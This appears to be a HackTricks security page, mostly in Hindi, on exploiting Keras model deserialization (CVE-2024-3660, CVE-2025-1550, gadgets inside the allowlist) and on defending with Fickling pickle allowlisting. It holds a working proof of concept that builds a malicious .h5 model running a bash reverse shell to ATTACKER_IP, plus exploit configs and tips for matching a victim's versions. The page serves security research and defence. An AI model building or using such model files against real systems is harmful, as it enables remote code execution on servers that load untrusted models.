# Keras Model Deserialization RCE और Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

यह पेज Keras model deserialization pipeline के विरुद्ध practical exploitation techniques का सारांश देता है, native .keras format internals और attack surface को समझाता है, और Model File Vulnerabilities (MFVs) तथा post-fix gadgets खोजने के लिए researcher toolkit प्रदान करता है।

## .keras model format internals

एक .keras file एक ZIP archive होती है, जिसमें कम से कम ये शामिल होते हैं:<sup>[[1]](#references)</sup>
- metadata.json – सामान्य जानकारी (जैसे, Keras version)
- config.json – model architecture (primary attack surface)
- model.weights.h5 – HDF5 में weights

config.json recursive deserialization को नियंत्रित करता है: Keras modules import करता है, classes/functions को resolve करता है और attacker-controlled dictionaries से layers/objects को reconstruct करता है।<sup>[[1]](#references)</sup>

Dense layer object का example snippet:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization निम्न कार्य करता है:<sup>[[1]](#references)</sup>
- module/class_name keys से Module import और symbol resolution
- attacker-controlled kwargs के साथ from_config(...) या constructor invocation
- nested objects (activations, initializers, constraints, आदि) में recursion

ऐतिहासिक रूप से, इससे config.json तैयार करने वाले attacker को तीन primitives प्राप्त हुए:<sup>[[1]](#references)</sup>
- import किए जाने वाले modules पर नियंत्रण
- resolve की जाने वाली classes/functions पर नियंत्रण
- constructors/from_config को पास किए जाने वाले kwargs पर नियंत्रण

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Lambda.from_config() ने python_utils.func_load(...) का उपयोग किया, जो attacker bytes को base64-decode करता है और marshal.loads() को call करता है; Python unmarshalling code execute कर सकता है।<sup>[[1]](#references)[[3]](#references)</sup>

Exploit idea (config.json में simplified payload):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras डिफ़ॉल्ट रूप से safe_mode=True लागू करता है। Lambda में Serialized Python functions को तब तक block किया जाता है, जब तक user स्पष्ट रूप से safe_mode=False के साथ opt out न करे।<sup>[[1]](#references)</sup>

Notes:
- Legacy formats (पुराने HDF5 saves) या पुराने codebases में modern checks लागू नहीं हो सकते, इसलिए जब victims पुराने loaders का उपयोग करते हैं, तब “downgrade” style attacks अभी भी लागू हो सकते हैं।

## CVE-2025-1550 – Keras ≤ 3.8 में Arbitrary module import

Root cause:
- _retrieve_class_or_fn ने config.json से प्राप्त attacker-controlled module strings के साथ unrestricted importlib.import_module() का उपयोग किया।
- Impact: किसी भी installed module (या sys.path पर attacker द्वारा रखे गए module) का Arbitrary import। Import-time code चलता है, जिसके बाद attacker kwargs के साथ object construction होता है।<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: imports केवल official ecosystem modules तक सीमित: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True असुरक्षित Lambda serialized-function loading को block करता है
- Basic type checking: deserialized objects का expected types से match होना आवश्यक है

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

कई production stacks अब भी legacy TensorFlow-Keras HDF5 model files (.h5) स्वीकार करते हैं। यदि attacker ऐसा model upload कर सकता है जिसे server बाद में load करता है या जिस पर inference चलाता है, तो Lambda layer load/build/predict के दौरान arbitrary Python execute कर सकती है।<sup>[[7]](#references)</sup>

deserialized या उपयोग किए जाने पर reverse shell execute करने वाला malicious .h5 बनाने के लिए Minimal PoC:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
नोट्स और reliability tips:
- Trigger points: code कई बार run हो सकता है (जैसे layer build/first call, model.load_model और predict/fit के दौरान)। payloads को idempotent बनाएं।<sup>[[7]](#references)</sup>
- Version pinning: serialization mismatches से बचने के लिए victim के TF/Keras/Python versions से match करें। उदाहरण के लिए, Python 3.8 के अंतर्गत TensorFlow 2.13.1 के साथ artifacts build करें, यदि target भी यही उपयोग करता है।<sup>[[7]](#references)</sup>
- Quick environment replication:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validation: `os.system("ping -c 1 YOUR_IP")` जैसा benign payload reverse shell पर switch करने से पहले execution की पुष्टि करने में मदद करता है (जैसे, `tcpdump` के साथ ICMP observe करके)।<sup>[[7]](#references)</sup>

## allowlist के अंदर Post-fix gadget surface

allowlisting और safe mode के बावजूद, allowed Keras callables के बीच एक broad surface मौजूद रहती है। उदाहरण के लिए, `keras.utils.get_file` arbitrary URLs को user-selectable locations पर download कर सकता है।<sup>[[1]](#references)</sup>

ऐसे Lambda के माध्यम से Gadget, जो किसी allowed function को reference करता है (serialized Python bytecode नहीं):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
महत्वपूर्ण सीमा:
- Lambda.call() target callable को invoke करते समय input tensor को पहले positional argument के रूप में prepend करता है। चुने गए gadgets को अतिरिक्त positional arg सहन करना चाहिए (या *args/**kwargs स्वीकार करने चाहिए)। यह सीमित करता है कि कौन-से functions viable हैं।<sup>[[1]](#references)</sup>

## AI/ML models के लिए ML pickle import allowlisting (Fickling)

कई AI/ML model formats (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, पुराने TensorFlow artifacts आदि) Python pickle data embed करते हैं। Attackers load के दौरान RCE या model swapping हासिल करने के लिए pickle GLOBAL imports और object constructors का नियमित रूप से दुरुपयोग करते हैं। Blacklist-based scanners अक्सर नए या unlisted dangerous imports को miss कर देते हैं।<sup>[[8]](#references)[[14]](#references)</sup>

एक practical fail-closed defense है कि Python के pickle deserializer को hook किया जाए और unpickling के दौरान केवल harmless ML-related imports के reviewed set को allow किया जाए। Trail of Bits का Fickling इस policy को implement करता है और हजारों public Hugging Face pickles से बनाया गया curated ML import allowlist प्रदान करता है।<sup>[[8]](#references)[[13]](#references)</sup>

“safe” imports के लिए security model (research और practice से निकली intuitions): pickle द्वारा उपयोग किए गए imported symbols को एक साथ इन शर्तों को पूरा करना चाहिए:<sup>[[8]](#references)</sup>
- Code execute या execution cause न करें (compiled/source code objects, shelling out, hooks आदि नहीं)
- Arbitrary attributes या items को get/set न करें
- Pickle VM से अन्य Python objects के references को import या obtain न करें
- किसी secondary deserializer (जैसे marshal, nested pickle) को trigger न करें, indirect रूप से भी नहीं

Process startup में जितना संभव हो उतना early Fickling की protections enable करें, ताकि frameworks द्वारा किए गए कोई भी pickle loads (torch.load, joblib.load आदि) check किए जा सकें:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Operational tips:
- आप आवश्यकतानुसार hooks को अस्थायी रूप से disable/re-enable कर सकते हैं:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- यदि कोई known-good model block हो जाता है, तो symbols की समीक्षा करने के बाद अपने environment के लिए allowlist बढ़ाएँ:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling अधिक granular control पसंद करने पर generic runtime guards भी उपलब्ध कराता है:<sup>[[9]](#references)</sup>
- सभी pickle.load() के लिए checks लागू करने हेतु fickling.always_check_safety()
- scoped enforcement के लिए with fickling.check_safety():
- one-off checks के लिए fickling.load(path) / fickling.is_likely_safe(path)

- जब संभव हो, non-pickle model formats (जैसे, SafeTensors) को प्राथमिकता दें।<sup>[[15]](#references)</sup> यदि pickle स्वीकार करना आवश्यक हो, तो loaders को least privilege के अंतर्गत, network egress के बिना चलाएं और allowlist लागू करें।

यह allowlist-first strategy सामान्य ML pickle exploit paths को प्रभावी रूप से block करती है और compatibility को उच्च बनाए रखती है। ToB के benchmark में, Fickling ने 100% synthetic malicious files को flag किया और top Hugging Face repos से प्राप्त clean files में से लगभग 99% को allow किया।<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) allowed modules में systematic gadget discovery

keras, keras_nlp, keras_cv, keras_hub में candidate callables को enumerate करें और file/network/process/env side effects वाले callables को प्राथमिकता दें।<sup>[[1]](#references)</sup>

<details>
<summary>allowlisted Keras modules में संभावित रूप से dangerous callables को enumerate करें</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direct deserialization testing (no .keras archive needed)

स्वीकृत params जानने और side effects देखने के लिए crafted dicts को सीधे Keras deserializers में feed करें।<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Cross-version probing और formats

Keras अलग-अलग guardrails और formats वाले कई codebases/eras में मौजूद है:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, deletion के लिए निर्धारित)
- tf-keras: अलग से maintained
- Multi-backend Keras 3 (official): native .keras पेश किया गया

Regressions या missing guards का पता लगाने के लिए अलग-अलग codebases और formats (.keras बनाम legacy HDF5) पर tests दोहराएँ।

## References

- [1] [Keras Model Deserialization में Vulnerabilities की खोज (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – serialization में checks जोड़े गए](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling का नया AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – AI/ML environments को सुरक्षित करना (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacks की background जानकारी](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
